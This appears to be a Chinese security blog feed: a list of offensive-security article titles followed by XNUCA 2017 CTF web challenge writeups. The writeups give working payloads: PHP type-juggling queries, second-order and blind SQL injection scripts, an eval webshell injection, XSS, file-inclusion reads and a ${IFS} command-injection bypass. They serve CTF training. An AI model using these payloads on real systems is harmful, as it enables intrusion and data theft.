PHP反序列化漏洞成因及漏洞挖掘技巧与案例 php mail header injection What is Email Header Injection? PHP Email Injection Example 其他 php &amp; apache2 &amp;操作系统之间的一些黑魔法 php内存破坏漏洞exp编写和禁用函数绕过 挖掘PHP禁用函数绕过利用姿势 .user.ini文件构成的PHP后门 php代码审计 论PHP常见的漏洞 浅谈代码审计入门实战：某博客系统最新版审计之旅 ctf中的php代码审计技巧 PHP代码审计tips 代码审计之文件越权和文件上传搜索技巧 PHP代码审计入门集合 PHP代码审计学习 PHP漏洞挖掘思路+实例 PHP漏洞挖掘思路+实例 第二章 浅谈代码审计入门实战：某博客系统最新版审计之旅 java-Web反序列 如何攻击Java反序列化过程 深入理解JAVA反序列化漏洞 Attacking Java Deserialization jackson反序列化详细分析 Struct2 Struts2 命令执行系列回顾 java-Web代码审计 Java代码审计连载之—SQL注入 Java代码审计连载之—任意文件下载 Java代码审计连载之—XSS Java代码审计连载之—添油加醋 其他 层层放大java审计的攻击面 以Java的视角来聊聊SQL注入 站在Java的视角，深度分析防不胜防的小偷——“XSS” 你的 Java web 配置安全吗？ Java代码审计PPT spring任意文件读取 python-Web Python 格式化字符串漏洞（Django为例） format注入 Be Careful with Python’s New-Style String Format Python urllib HTTP头注入漏洞 Hack Redis via Python urllib HTTP Header Injection Python Waf黑名单过滤下的一些Bypass思路 Python Sandbox Bypass pyt: 针对 Python 应用程序的源码静态分析工具 Node-js Pentesting Node.js Application : Nodejs Application Security(需翻墙) 从零开始学习渗透Node.js应用程序 WAF相关 牛逼牛逼的payload和bypass总结 WAF绕过参考资料 浅谈WAF绕过技巧 addslashes防注入的绕过案例 浅谈json参数解析对waf绕过的影响 WAF攻防研究之四个层次Bypass WAF 使用HTTP头去绕过WAF 会找漏洞的时光机: Pinpointing Vulnerabilities 渗透测试Course Web Service 渗透测试从入门到精通 渗透标准 Penetration Testing Tools Cheat Sheet 信息收集 看我如何收集全网IP的whois信息 浅谈Web渗透测试中的信息收集 渗透测试教程：如何侦查目标以及收集信息？ 本屌的web漏洞扫描器思路 技巧总结（域名信息收集篇） 子域名的艺术 实例演示如何科学的进行子域名收集 【渗透神器系列】搜索引擎 域渗透基础简单信息收集（基础篇） 内网渗透定位技术总结 后渗透攻防的信息收集 安全攻城师系列文章－敏感信息收集 子域名枚举的艺术 论二级域名收集的各种姿势 我眼中的渗透测试信息搜集 大型目标渗透－01入侵信息搜集 乙方渗透测试之信息收集 渗透 【玩转Linux系统】Linux内网渗透 渗透测试指南之域用户组的范围 内网主机发现技巧补充 Linux 端口转发特征总结 内网渗透（持续更新） 实战 SSH 端口转发 多重转发渗透隐藏内网 内网转发姿势 内网转发的工具 Linux 下多种反弹 shell 方法 php 反弹shell 利用ew轻松穿透多级目标内网 windows内网渗透杂谈 Windows域横向渗透 内网渗透中转发工具总结 内网渗透思路整理与工具使用 Cobalt strike在内网渗透中的使用 反向socks5代理(windows版) Windows渗透基础 通过双重跳板漫游隔离内网 A Red Teamer’s guide to pivoting 穿越边界的姿势 内网端口转发及穿透 秘密渗透内网——利用 DNS 建立 VPN 传输隧道 Reverse Shell Cheat Sheet 渗透实战 挖洞经验 | 看我如何综合利用4个漏洞实现GitHub Enterprise远程代码执行 Splash SSRF到获取内网服务器ROOT权限 Pivoting from blind SSRF to RCE with HashiCorp Consul 我是如何通过命令执行到最终获取内网Root权限的 信息收集之SVN源代码社工获取及渗透实战 SQL注入+XXE+文件遍历漏洞组合拳渗透Deutsche Telekom 渗透 Hacking Team 由视频系统SQL注入到服务器权限 From Serialized to Shell :: Exploiting Google Web Toolkit with EL Injection 浅谈渗透测试实战 渗透测试学习笔记之案例一 渗透测试学习笔记之案例二 提权 提权技巧 linux-kernel-exploits Linux平台提权漏洞集合 windows-kernel-exploits Windows平台提权漏洞集合 Linux MySQL Udf 提权 windows提权系列上篇 Windows提权系列中篇 渗透技巧 域渗透神器Empire安装和简单使用 如何将简单的Shell转换成为完全交互式的TTY 60字节 - 无文件渗透测试实验 内网渗透思路探索之新思路的探索与验证 Web端口复用正向后门研究实现与防御 端口渗透总结 端口扫描那些事 渗透技巧——通过cmd上传文件的N种方法 域渗透TIPS：获取LAPS管理员密码 域渗透——Security Support Provider 内网渗透随想 域渗透之流量劫持 渗透技巧——快捷方式文件的参数隐藏技巧 后门整理 Linux后门整理合集（脉搏推荐） 运维 黑客入侵应急分析手工排查 企业常见服务漏洞检测&amp;修复整理 Linux基线加固 CTF技巧总结 ctf-wiki CTF中那些脑洞大开的编码和加密 CTF加密与解密 CTF中图片隐藏文件分离方法总结 Md5扩展攻击的原理和应用 CTF比赛中关于zip的总结 十五个Web狗的CTF出题套路 CTF备忘录 rcoil:CTF线下攻防赛总结 杂 谈谈HTML5本地存储——WebStorage Linux下容易被忽视的那些命令用法 各种脚本语言不同版本一句话开启 HTTP 服务器的总结 WebAssembly入门：将字节码带入Web世界 phpwind 利用哈希长度扩展攻击进行getshell 深入理解hash长度扩展攻击（sha1为例） Joomla 框架的程序执行流程及目录结构分析 如何通过恶意插件在Atom中植入后门]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XNUCA 2017-Web专题赛前指导-php是最好的语言-writeup]]></title>
      <url>%2F2017%2F08%2F18%2FXNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-php%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80-writeup%2F</url>
      <content type="text"><![CDATA[php弱类型比较strcmp、eregi 题目1http://218.76.35.75:20114/ Solution源代码如下:1234567891011121314151617181920212223242526272829303132&lt;?phpshow_source(__FILE__);$v1=0;$v2=0;$v3=0;$a=(array)json_decode(@$_GET['foo']);if(is_array($a))&#123; is_numeric(@$a["bar1"])?die("nope"):NULL; if(@$a["bar1"])&#123; ($a["bar1"]&gt;2016)?$v1=1:NULL; &#125; if(is_array(@$a["bar2"]))&#123; if(count($a["bar2"])!==5 OR !is_array($a["bar2"][0])) die("nope"); $pos = array_search("nudt", $a["a2"]); $pos===false?die("nope"):NULL; foreach($a["bar2"] as $key=&gt;$val)&#123; $val==="nudt"?die("nope"):NULL; &#125; $v2=1; &#125;&#125;$c=@$_GET['cat'];$d=@$_GET['dog'];if(@$c[1])&#123; if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123; eregi("3|1|c",$d.$c[0])?die("nope"):NULL; strpos(($c[0].$d), "htctf2016")?$v3=1:NULL; &#125;&#125;if($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; include "flag.php"; echo $flag;&#125;?&gt; 接下来逐步分析。目标是让v1，v2，v3都为 1，这样才能得到flag。 v112345678$a=(array)json_decode(@$_GET['foo']);if(is_array($a))&#123; is_numeric(@$a["bar1"])?die("nope"):NULL; if(@$a["bar1"])&#123; ($a["bar1"]&gt;2016)?$v1=1:NULL; &#125; ....&#125; 传入的foo，经过一次json_decode，然后转换成array。然后判断 $a[&quot;bar1&quot;] 是否满足 is_numeric，若满足则die掉。接下来又判断 $a[&quot;bar1&quot;] 是否大于 2016 。 利用php弱类型特性，可以设置1$a[&quot;bar1&quot;] = 2017a 这样is_numeric时会判断其为字符串而不是数字，而在与2016的比较中，会直接转换成2017，满足大于2016。这样 v1 就被设置为 1 了。 v2123456789if(is_array(@$a["bar2"]))&#123; if(count($a["bar2"])!==5 OR !is_array($a["bar2"][0])) die("nope"); $pos = array_search("nudt", $a["a2"]); $pos===false?die("nope"):NULL; foreach($a["bar2"] as $key=&gt;$val)&#123; $val==="nudt"?die("nope"):NULL; &#125; $v2=1;&#125; 接下来，要求$a[&quot;bar2&quot;]是个数组，其中元素的个数为5个（count($a[“bar2”])!==5），同时要求$a[&quot;bar2&quot;][0]是数组。所以我们设置:1$a[&quot;bar2&quot;] = [[],2,3,4,5] 对于 $pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]);，它搜索字符串“nudt”在$a[“a2”]中的位置。若没有找到，array_search返回false，会通过严格比较导致die掉。所以这里要设置：1$a[&quot;a2&quot;] = “nudt” 注意这里因为用了$pos===false?的严格比较，所以0不===false。 之后就能设置 v2 = 1 结合$a是由json_decode得来，所以第一个payload为：1foo=&#123;&quot;bar1&quot;:&quot;2017a&quot;,&quot;bar2&quot;:[[],2,3,4,5],&quot;a2&quot;:[&quot;nudt&quot;]&#125; v3123456789101112$c=@$_GET['cat'];$d=@$_GET['dog'];if(@$c[1])&#123; if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123; eregi("3|1|c",$d.$c[0])?die("nope"):NULL; strpos(($c[0].$d), "htctf2016")?$v3=1:NULL; &#125;&#125;if($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; include "flag.php"; echo $flag;&#125; 先会用strcmp进行比较，利用数组array和字符串进行strcmp比较会返回null，而且数组array也不会等于字符串，我们可以设置cat[1]为一个数组。 接下来用eregi对拼接后的字符串$d.$c[0]进行正则匹配，若匹配到则die掉。而下一步又要求拼接字符串$c[0].$d中要有字符串“htctf2016”。这里利用%00对eregi的截断功能，则在正则匹配eregi时在开头时就匹配结束掉。 strpos(($c[0].$d), &quot;htctf2016&quot;)中，还要求“htctf2016”不能出现在开头。 所以设置：123$d = %00 即 dog=%00$c[0] = &quot;ahtctf2016&quot; 所以综上所述，构造总的payload如下：1http://218.76.35.75:20114/?foo=&#123;&quot;bar1&quot;:&quot;2017e&quot;,&quot;bar2&quot;:[[],2,3,4,5],&quot;a2&quot;:[&quot;nudt&quot;]&#125;&amp;cat[0]=ahtctf2016&amp;cat[1][]=&amp;dog=%00 得到flag:1php_i5_n0t_b4d 后记题目已收录进：CTF-Web-Challenge-php：challenge-2]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XNUCA 2017-Web专题赛前指导-vote-writeup]]></title>
      <url>%2F2017%2F08%2F18%2FXNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-vote-writeup%2F</url>
      <content type="text"><![CDATA[源码泄露、二次注入 题目123描述：据说可以注入，然而……http://218.76.35.75:65080/ Solution一个简单的投票功能。初步测试后没有回显，没有报错。在CTF中，越是简单越是没有提示的，往往都有源码泄露之类的。 源码泄露/恢复访问：1http://218.76.35.75:65080/.index.php.swp 下载下来，win下下下来后文件名变成了index.php.swp。用vim恢复文件。命令如下：1vim -r index.php 直接在vim中看可能不太方便，可以用下面的命令将其另存为：1w filename 得到恢复后的源码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?phpinclude 'db.php';session_start();if (!isset($_SESSION['login'])) &#123; $_SESSION['login'] = 'guest'.mt_rand(1e5, 1e6);&#125;$login = $_SESSION['login'];if (isset($_POST['submit'])) &#123; if (!isset($_POST['id'], $_POST['vote']) || !is_numeric($_POST['id'])) die('please select ...'); $id = $_POST['id']; $vote = (int)$_POST['vote']; if ($vote &gt; 5 || $vote &lt; 1) $vote = 1; $q = mysql_query("INSERT INTO t_vote VALUES (&#123;$id&#125;, &#123;$vote&#125;, '&#123;$login&#125;')"); $q = mysql_query("SELECT id FROM t_vote WHERE user = '&#123;$login&#125;' GROUP BY id"); echo '&lt;p&gt;&lt;b&gt;Thank you!&lt;/b&gt; Results:&lt;/p&gt;'; echo '&lt;table border="1"&gt;'; echo '&lt;tr&gt;&lt;th&gt;Logo&lt;/th&gt;&lt;th&gt;Total votes&lt;/th&gt;&lt;th&gt;Average&lt;/th&gt;&lt;/tr&gt;'; while ($r = mysql_fetch_array($q)) &#123; $arr = mysql_fetch_array(mysql_query("SELECT title FROM t_picture WHERE id = ".$r['id'])); echo '&lt;tr&gt;&lt;td&gt;'.$arr[0].'&lt;/td&gt;'; $arr = mysql_fetch_array(mysql_query("SELECT COUNT(value), AVG(value) FROM t_vote WHERE id = ".$r['id'])); echo '&lt;td&gt;'.$arr[0].'&lt;/td&gt;&lt;td&gt;'.round($arr[1],2).'&lt;/td&gt;&lt;/tr&gt;'; &#125; echo '&lt;/table&gt;'; echo '&lt;br&gt;&lt;a href="index.php"&gt;goBack&lt;/a&gt;&lt;br&gt;'; exit;&#125;?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Movie vote&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Welcome, Movie vote&lt;/p&gt;&lt;form action="index.php" method="POST"&gt;&lt;table border="1" cellspacing="5"&gt;&lt;tr&gt;&lt;?php$q = mysql_query('SELECT * FROM t_picture');while ($r = mysql_fetch_array($q)) &#123; echo '&lt;td&gt;&lt;img src="./images/'.$r['image'].'"&gt;&lt;div align="center"&gt;'.$r['title'].'&lt;br&gt;&lt;input type="radio" name="id" value="'.$r['id'].'"&gt;&lt;/div&gt;&lt;/td&gt;';&#125;?&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;Your vote:&lt;select name="vote"&gt;&lt;option value="1"&gt;1&lt;/option&gt;&lt;option value="2"&gt;2&lt;/option&gt;&lt;option value="3"&gt;3&lt;/option&gt;&lt;option value="4"&gt;4&lt;/option&gt;&lt;option value="5"&gt;5&lt;/option&gt;&lt;/select&gt;&lt;/p&gt;&lt;input type="submit" name="submit" value="Submit"&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 二次注入注入点在这里：1if (!isset($_POST[&apos;id&apos;], $_POST[&apos;vote&apos;]) || !is_numeric($_POST[&apos;id&apos;])) post进的参数id，经过php的函数is_numeric()检测后，insert到数据库中；1$q = mysql_query(&quot;INSERT INTO t_vote VALUES (&#123;$id&#125;, &#123;$vote&#125;, &apos;&#123;$login&#125;&apos;)&quot;); 在完成投票后，根据id值将title取出来：123456$q = mysql_query(&quot;SELECT id FROM t_vote WHERE user = &apos;&#123;$login&#125;&apos; GROUP BY id&quot;);。。。$r = mysql_fetch_array($q)。。。$arr = mysql_fetch_array(mysql_query(&quot;SELECT title FROM t_picture WHERE id = &quot;.$r[&apos;id&apos;]));echo &apos;&lt;tr&gt;&lt;td&gt;&apos;.$arr[0].&apos;&lt;/td&gt;&apos;; 当我们传入经过十六进制转换的payload后，通过is_numeric()的检查，然后被插入到数据库中。而mysql将数据取出来时候会自动unhex一下，从而造成sql注入。 根据泄露出来的源码，我们推测表为 t_flag，字段为flag。我们要注入后的语句为：1SELECT title FROM t_picture WHERE id = -2 UNION SELECT GROUP_CONCAT(flag) FROM t_flag 这样因为不存在id为-2，从而能显示出flag。即payload为：12345hex(-2 UNION SELECT GROUP_CONCAT(flag) FROM t_flag) =&gt;0x2d322020554e494f4e2053454c4543542047524f55505f434f4e43415428666c6167292046524f4d20745f666c6167 flag:16yvt6eYziAHgVRKz3re]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XNUCA 2017-Web专题赛前指导-最安全的笔记管理系统-writeup]]></title>
      <url>%2F2017%2F08%2F17%2FXNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E6%9C%80%E5%AE%89%E5%85%A8%E7%9A%84%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-writeup%2F</url>
      <content type="text"><![CDATA[未完待续 题目123描述：没错，就是最安全的笔记管理系统，快来管理你的笔记吧~http://218.76.35.74:20128 访问后有一个登陆。用弱口令admin：admin可以进入。登陆后出现一个hint：./dbinit.sql 访问：1http://218.76.35.74:20128/dbinit.sql 得到如下信息：1234567891011121314151617181920212223242526272829303132333435363738CREATE DATABASE `taolu` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;drop table if exists `user`;create table `user`( `id` int(11) not null primary key auto_increment, `uname` varchar(20) not null, `password` varchar(32) not null, `level` tinyint not null)ENGINE=InnoDB DEFAULT CHARSET=utf8;drop table if exists `note`;create table `note` ( `id` int(11) not null primary key auto_increment, `content` varchar(255) not null, `title` varchar(255) not null, `userid` int(11) not null) ENGINE=InnoDB DEFAULT CHARSET=utf8 ;drop table if exists `page` ;create table `page` ( `num` varchar not null)ENGINE=InnoDB DEFAULT CHARSET=utf8;drop table if exists `flags`;create table `flags` ( `id` tinyint not null primary key , `flag` varchar(50) not null)ENGINE=InnoDB DEFAULT CHARSET=utf8;insert into `page` values (20);insert into `note` (title,content,userid)values( '测试笔记','这是管理员发布的测试笔记,个人无法删除(hint:./dbinit.sql)',1) 。。不过。。。还没想出来后面咋做。。。 后记此题为 2017 铁人三项地区资格赛-套路那么长 原题。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XNUCA 2017-Web专题赛前指导-default-writeup]]></title>
      <url>%2F2017%2F08%2F16%2FXNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-default-writeup%2F</url>
      <content type="text"><![CDATA[代码执行，闭合构造 题目：123描述：主页都没有了，就不要扫我了http://218.76.35.74:20131 Solution此时不扫更待何时。。。扫出一个 index2.php:12345678&lt;?phpinclude "flag2.php";error_reporting(0);show_source(__FILE__);$a = @$_REQUEST['hello'];eval("var_dump($a);"); 传入的参数会经过var_dump()，这里给出两种payload。 payload112345?hello=);eval($_POST[&apos;A&apos;]);%2f%2f或?hello=);eval(phpinfo());// var_dump($a);后的结果为1string(22) &quot;);eval($_POST[&apos;A&apos;]);//&quot; 即1eval(&quot;string(21) &quot;);eval($_GET[&apos;A&apos;]);//&quot;&quot;); payload21?hello=);eval($_GET[c]&amp;c=phpinfo(); var_dump()后的结果是1string(15) &quot;);eval($_GET[c]&quot; 即1eval(&quot;string(17) &quot;);eval($_GET[c]&quot; string(0) &quot;&quot; &quot;); 因此可以通过构造闭合引号。用菜刀连上： 真正的flag在flag1.php里。得到flag：1F8871804DD8C20C66D2386B3E51ADEC4 题外话已将此题收录进 CTF-Web-Challenge]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XNUCA 2017-Web专题赛前指导-部分简单题汇总-writeup]]></title>
      <url>%2F2017%2F08%2F16%2FXNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%83%A8%E5%88%86%E7%AE%80%E5%8D%95%E9%A2%98%E6%B1%87%E6%80%BB-writeup%2F</url>
      <content type="text"><![CDATA[这些都是一些很简单的题。另有一些题会单独拿出来写。 捉迷藏1http://218.76.35.75:20111 查看源代码，发现链接：http://218.76.35.75:20111/Index.php得到flag：1th!5!5n0tth3fl@g 简单问答1http://218.76.35.75:20112 回答三个问题，答案如下：123456Q1) This is HT-CTF____&quot; : 2016Q2) Acronym for &quot;laughing out loud&quot; : lolQ3) Standard port for SSH : 22 首先用f12，将&lt;input type=&quot;submit&quot; disabled value=&quot;Submit Quiz&quot;&gt;中的disabled去掉。选择对应的选项，然后用burp截包，截取得到的post包数据如下：1q1=2015&amp;q2=lol+&amp;q4=22&amp;success=false 将2015改为2016，将lol+改为lol，将q4改为q3，将false改为true。如下：1q1=2016&amp;q2=lol&amp;q3=22&amp;success=true 发包，得到flag：1W3ll_d0n3 后台后台后台1http://218.76.35.75:20113/ 试着进入Admin Portal，同时用burp截包看看： 1234567891011121314POST / HTTP/1.1Host: 218.76.35.75:20113User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://218.76.35.75:20113/Cookie: PHPSESSID=lhempf2nd6m7oj4joinm11pmh7; User=JohnTan101; Member=Tm9ybWFsConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 17adminportal=Enter 其中Cookie字段中，User为JohnTan101，Member为Tm9ybWFs，用base64解码后为Normal。Forward掉后，页面返回提示：Only Member with Admin rights is allow to enter将Admin进行base64加密后得到QWRtaW4=，作为Member的值，发包，得到flag:1C00ki3_n0m_n0m_n0m php是最好的语言login1http://218.76.35.75:20115/ 进去后有三个功能：main显示主页，info显示phpinfo，login是登陆页面。访问时可以发现参数是page=main之类的。猜测有包含，可以利用php伪协议读取源码。12http://218.76.35.75:20115/?page=php://filter/read=convert.base64-encode/resource=login 得到login的源码如下:12345678910111213141516171819&lt;?php$login=@$_POST['login'];$password=@$_POST['password'];if(@$login=="admin" &amp;&amp; sha1(@$password)==$pwhash)&#123; include('flag.txt');&#125;else if (@$login&amp;&amp;@$password&amp;&amp;@$_GET['debug']) &#123; echo "Login error, login credentials has been saved to ./log/".htmlentities($login).".log"; $logfile = "./log/".$login.".log"; file_put_contents($logfile, $login."\n".$password);&#125;?&gt; &lt;center&gt; login&lt;br/&gt;&lt;br/&gt; &lt;form action="" method="POST"&gt; &lt;input name="login" placeholder="login"&gt;&lt;br/&gt; &lt;input name="password" placeholder="password"&gt;&lt;br/&gt;&lt;br/&gt; &lt;input type="submit" value="Go!"&gt; &lt;/form&gt; &lt;/center&gt; 另外读取到index.php的源码1http://218.76.35.75:20115/?page=php://filter/read=convert.base64-encode/resource=index 12345678910111213&lt;?php$pwhash="ffd313052dab00927cb61064a392f30ee454e70f";if (@$_GET['log']) &#123; if(file_exists($_GET['log'].".log"))&#123; include("flag.txt");&#125;&#125;if(@$_GET['page'] != 'index')&#123; include((@$_GET['page']?$_GET['page'].".php":"main.php"));&#125;?&gt; 我们先访问:123http://218.76.35.75:20115/?page=login&amp;debug=1POST: login=admin&amp;password=1 然后页面会返回：Login error, login credentials has been saved to ./log/admin.log 接着返回index.php，借助index.php里的这个log，就可以得到flag：1http://218.76.35.75:20115/?log=./log/admin 最后的flag为：110caL_File_1nc1usi0n_C@n_B3_fun http 头注入1http://218.76.35.75:20121/ test.tx123456789GET /heetian.php HTTP/1.1Host: 218.76.35.75:20121User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://218.76.35.75:20121/Connection: closeUpgrade-Insecure-Requests: 1 用sqlmap跑：1python sqlmap.py -r test.txt --level 3 -D ctfweb20110 -T flag --dump 得到flag：1Y0ugetT82f00000laev 简单的文件上传12描述：上传php 文件就给你flaghttp://218.76.35.75:20122 截断上传。flag：1Upl00d30668ss9h97aFil3 简单的JS1http://218.76.35.75:20123/ 查看源代码，将12p="60,105,102,114,97,109,101,32,104,101,105,103,1...12,34,62"p=eval("String.fromCharCode("+p+")"); 放到控制台里运行一下，得到如下结果：1&lt;iframe height=0 width=0 src=&quot;./fl0a.php&quot;&gt; 访问:1http://218.76.35.75:20123/fl0a.php 用burp查看返回包，在Cookie字段发现flag：1C00k1els60SecU5e php 是门松散的语言1http://218.76.35.75:20124/ 得到源代码，可知是变量覆盖问题，parse_str() 函数把查询字符串解析到变量中。1234567$he =&apos;goodluck&apos;;parse_str($_GET[&apos;heetian&apos;]);if $he = &apos;abcd&apos;;echo $flag; 访问：12http://218.76.35.75:20124/?heetian=he=abcd 得到flag：1C00d1uckf0rY0uuu 试试xss123描述：alert document.domainhttp://218.76.35.75:20125 fuzz一下，闭合前面的单引号：1#&apos; onerror=alert(document.domain) 得到flag:1D0Gum6Ntd0M11n 简单的文件包含123描述：Flag 在/flaghttp://218.76.35.75:20126 访问：1http://218.76.35.75:20126/index.php?page=/flag 查看源代码，得到：1flag: 62a72cb2f3d5e7fc0284da9f21e66c9f.php 访问：1http://218.76.35.75:20126/62a72cb2f3d5e7fc0284da9f21e66c9f.php 得到flag：1F11elNcLud3Get 简单的验证123描述：你不是amdin，没有权限查看flaghttp://218.76.35.75:20127 截包，看Cookie字段：1Cookie: user=Bob; guess=999 题目的提示错了，应该是admin。把Bob改为admin，然后guess用burp来爆破，得到flag：1EaSy70Ch1ngG00kie GG123描述：游戏似乎很无聊啊http://218.76.35.75:65380/ 访问后查看源代码，有个 tetris.js 。前端游戏这种，往往是在打通关之类的会给一些奇葩的提示或者直接出flag。对代码进行美化后，比如搜索gameover。找到：12345678910this.gameOver = function() &#123; b.stats.stop(); b.puzzle.stop(); document.getElementById(&quot;tetris-nextpuzzle&quot;).style.display = &quot;none&quot;; document.getElementById(&quot;tetris-gameover&quot;).style.display = &quot;block&quot;; if (this.highscores.mayAdd(this.stats.getScore())) &#123; var e = prompt(&quot;Game Over !\nEnter your name:&quot;, &quot;&quot;); e &amp;&amp; e.trim().length &amp;&amp; this.highscores.add(e, this.stats.getScore()) &#125;&#125;; 里面有mayAdd，找到一处：12345this.mayAdd = function(a) &#123; if (this.scores.length &lt; this.maxscores) return 1E6 &lt; a &amp;&amp; (a = new p, a.set("urlkey", "webqwer" [1] + "100.js", 864E5)), !0; for (var b = this.scores.length - 1; 0 &lt;= b; --b) if (this.scores[b].score &lt; a) return 1E6 &lt; a &amp;&amp; (a = new p, a.set("urlkey", "webqwer" [1] + "100.js", 864E5)), !0; return !1 &#125;; &quot;webqwer&quot; [1] + &quot;100.js&quot;，即e100.js。访问:1http://218.76.35.75:65380/e100.js 出现jsfuck编码，放到f12控制台里运行一下，得到flag：1oT0yTrjU0xhjhj2YTcT8jljMWpzS9tDk Reappear123描述：网管说他安装了什么编辑器，但是似乎不太会用。。。http://218.76.35.75:65180/ 访问后有提示：12Kindeditor v4.1.7something maybe in /kindeditor/ 网上有对应的信息泄露漏洞。访问：1http://218.76.35.75:65180/kindeditor/php/file_manager_json.php 得到如下数据：12345678910111213141516171819202122232425262728/var/www/html/Web/kind/kindeditor/attached&#123;&quot;moveup_dir_path&quot;:&quot;&quot;,&quot;current_dir_path&quot;:&quot;&quot;,&quot;current_url&quot;:&quot;\/kindeditor\/php\/..\/attached\/&quot;,&quot;total_count&quot;:2,&quot;file_list&quot;:[ &#123;&quot;is_dir&quot;:false, &quot;has_file&quot;:false, &quot;filesize&quot;:51, &quot;dir_path&quot;:&quot;&quot;, &quot;is_photo&quot;:false, &quot;filetype&quot;:&quot;php&quot;, &quot;filename&quot;:&quot;flag_clue.php&quot;, &quot;datetime&quot;:&quot;2015-11-16 21:58:28&quot; &#125;, &#123;&quot;is_dir&quot;:false, &quot;has_file&quot;:false, &quot;filesize&quot;:28, &quot;dir_path&quot;:&quot;&quot;, &quot;is_photo&quot;:false, &quot;filetype&quot;:&quot;html&quot;, &quot;filename&quot;:&quot;index.html&quot;, &quot;datetime&quot;:&quot;2015-11-16 21:37:12&quot; &#125; ]&#125; 里面有个 flag_clue.php 。访问:1http://218.76.35.75:65180/kindeditor/attached/flag_clue.php 得到：1=0nYvpEdhVmcnFUZu9GRlZXd7pzZhxmZ 脚本:123import base64key = &quot;=0nYvpEdhVmcnFUZu9GRlZXd7pzZhxmZ&quot;print(base64.b64decode(key[::-1])) 得到flag：1b&apos;flag:&#123;uveDoneAgreatJob&#125;&apos; DrinkCoffee123描述：据说登录可以领到咖啡票，不过不知道密码哦……http://218.76.35.75:65280/ 访问了之后如下： 需要我们输入一个密码，还有就是ip限制的要求，和来源的要求。 ip可以通过 X-Forwarded-For 伪造。来源 可以通过 Refferer 伪造。 抓包后可以看到头部有密码字段： 另外题目在form上加了一层图片，可以用firebug直接把图片去掉，然后就能submit密码了。 得到flag：184294deb396ba4373c5ea8b73fa111b2]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XNUCA 2017-Web专题赛前指导-阳光总在风雨后-writeup]]></title>
      <url>%2F2017%2F08%2F16%2FXNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%98%B3%E5%85%89%E6%80%BB%E5%9C%A8%E9%A3%8E%E9%9B%A8%E5%90%8E-writeup%2F</url>
      <content type="text"><![CDATA[mysql 盲注 命令执行 ${IFS}绕过 题目1http://218.76.35.74:20130/index.php SQL注入经过fuzz，一些关键字被过滤了：123456orforunion空格逗号，* 一些关键字没有过滤：1234567selectfromwheresubstrascii^. 无回显，考察盲注。用异或^进行注入。 给出利用脚本：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657# -*- coding:utf-8 -*-import requestsimport stringimport sysglobal findBitdef sendPayload(payload): proxy = &#123;"http":"http://127.0.0.1:8080"&#125; url = "http://218.76.35.74:20130/login.php" headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125; parm = "uname="+payload+"&amp;passwd=admin" content = requests.post(url,data=parm,headers=headers,proxies=proxy) return content.textusernameerr = "username error!!"def generateTarget(flag): if flag == "database": return "database()" elif flag == "passwd": return "(SELECT(passwd)from(admin))"def doubleSearch(leftNum,rightNum,i,target): global findBit midNum = (leftNum + rightNum) / 2 if (rightNum != leftNum +1): payload = "admin'^(select(ascii(mid(("+generateTarget(target) +")from("+ str(i) +"))))&lt;="+str(midNum) +")='0" recv = sendPayload(payload) if usernameerr in recv: doubleSearch(midNum,rightNum,i,target) else: doubleSearch(leftNum,midNum,i,target) else: if rightNum != 0: sys.stdout.write(chr(rightNum)) sys.stdout.flush() else: findBit = 1 returndef exp(): global findBit i = 1 findBit = 0 print "The passwd:" target = "passwd" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") breakexp() 获得密码的Md5值为：50f87a3a3ad48e26a5d9058418fb78b5解密后为： shuangshuang 命令执行登陆后有一个命令执行的地方，但是过滤了空格，而且仅仅回显出结果的最后一条。参考：浅谈CTF中命令执行与绕过的小技巧，空格可以利用${IFS}替代。而回显可以利用head来选择。 输入1ls$&#123;IFS&#125;/var/www/html|head$&#123;IFS&#125;-n$&#123;IFS&#125;1 得到：19ef89ad913e848b64b73e3aa721e44e4 